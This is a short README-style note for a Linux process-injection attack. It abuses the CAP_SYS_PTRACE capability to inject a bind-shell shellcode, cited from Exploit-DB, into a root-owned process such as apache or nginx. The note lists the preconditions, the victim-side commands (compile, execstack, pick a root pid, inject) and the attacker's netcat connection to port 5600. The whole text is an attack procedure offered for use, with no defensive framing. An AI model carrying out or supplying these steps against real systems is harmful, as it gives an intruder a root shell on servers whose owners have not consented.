# memory_inject CAP_SYS_PTRACE capability

Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes) 
https://www.exploit-db.com/exploits/41128

1) The EUID of the process in 0 (aka privileged process)
2) The program file has CAP_SYS_PTRACE capability to debug the process 

TCP bind shell

victim host
1) $ gcc -o bind_shell bind_shell.c
2) $ execstack -s bind_shell
3) $ ps -eaf -> find pid number under root (apache, nginx, python, etc)
4) $ ./bind_shell pid_number

attacker host
1) $ nc victim_host 5600
